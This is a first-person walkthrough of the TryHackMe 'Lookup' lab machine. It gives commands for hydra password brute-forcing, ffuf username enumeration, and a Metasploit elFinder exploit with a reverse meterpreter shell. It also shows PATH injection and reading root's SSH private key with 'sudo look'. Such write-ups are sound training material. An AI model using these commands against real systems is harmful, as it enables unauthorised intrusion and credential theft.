# TryHackMe - Lookup (Easy)

Reconnaissance
I started with standard scanning:


sudo nmap -sC -sV -oN lookup.thm xxxx
Open ports:

22 (SSH)

80 (HTTP)

I opened the website — there was a login form. I first tried admin:admin. The login worked, but the password was incorrect, which meant the username exists.

I immediately ran Hydra to brute-force the password:


hydra -l admin -P /usr/share/wordlists/rockyou.txt xxxx http-post-form "/login.php:username=^USER^&password=^PASS^:Incorrect"
The result was empty.

Then I decided to check other users using ffuf:


ffuf -u http://xxxx/login.php -d "username=FUZZ&password=test" -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -mc 200
Found a second user: jose.

Gaining Access
Brute-forcing the password for jose:


hydra -l jose -P /usr/share/wordlists/rockyou.txt xxxx http-post-form "/login.php:username=^USER^&password=^PASS^:Incorrect"
Password found: jose:password123.

After logging in, the system suggested adding a new host:


echo "xxxx files.lookup.thm" | sudo tee -a /etc/hosts
Went to http://files.lookup.thm and saw the elFinder file manager. Checked its version and found an exploit using searchsploit elfinder.

In msfconsole, I used the module:


msfconsole
use exploit/multi/http/elfinder_php_connector_exec
set RHOSTS xxxx
set TARGETURI /elfinder/php/connector.minimal.php
set payload php/meterpreter/reverse_tcp
set LHOST tun0
run
Gained access as www-data.

Privilege Escalation — Switching to user think
Ran linpeas.sh:


./linpeas.sh
It showed the binary pwm running as root, which calls id and saves the output to ~/.passwords.

Tried a PATH injection:


echo "id_think" > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
After running the binary, I found the password for user think in ~/.passwords.

Logged in:


su think
This step was tricky but helped understand how PATH injection can reveal passwords.

Privilege Escalation — Root
Checked sudo privileges:


sudo -l
It turned out that think can run the binary look as root.

On GTFOBins, I found a way to use it to read files:


sudo look '' /root/.ssh/id_rsa
Copied the root key, saved it:


nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@xxxx
Gained root access.

Additional Attempts
I tried CVE-2021-3560 (mentioned in linpeas report), but it didn’t work. The main working path was through look and the root private key.

New Knowledge and Commands
ffuf has special user lists.

For brute-force, it’s important to specify the exact file, e.g., login.php.

Practical experience with PATH injection via export PATH=/tmp:$PATH.

Experience with sudo -l and GTFOBins.

Using private keys to gain root access via SSH.

Conclusion
Managed to complete the machine:

Reconnaissance: nmap, ffuf, hydra
Exploitation: elFinder via msfconsole
Privilege Escalation: PATH injection → user think
Privileges: sudo look → root via SSH key

Although there were challenges (especially understanding PATH injection and password brute-forcing), the experience was very useful.
